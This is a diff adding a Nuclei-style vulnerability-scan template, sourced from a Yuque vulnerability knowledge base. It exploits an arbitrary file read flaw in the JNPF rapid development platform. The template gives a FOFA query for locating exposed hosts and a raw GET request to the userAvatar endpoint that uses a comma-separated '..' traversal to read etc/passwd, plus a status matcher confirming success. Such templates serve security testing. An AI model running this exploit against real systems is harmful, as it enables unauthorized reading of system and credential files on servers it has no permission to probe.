@@ -1,0 +1,29 @@
+id: poc-wg86npbk2ahn033l
+info:
+  name: JNPF快速开发平台 userAvatar 存在任意文件文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wg86npbk2ahn033l'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wg86npbk2ahn033l
+    fofa: title="JNPF快速开发平台"
+http:
+- raw:
+  - 'GET /api/file/Image/userAvatar/aa,..,..,..,..,..,..,..,..,..,etc,passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
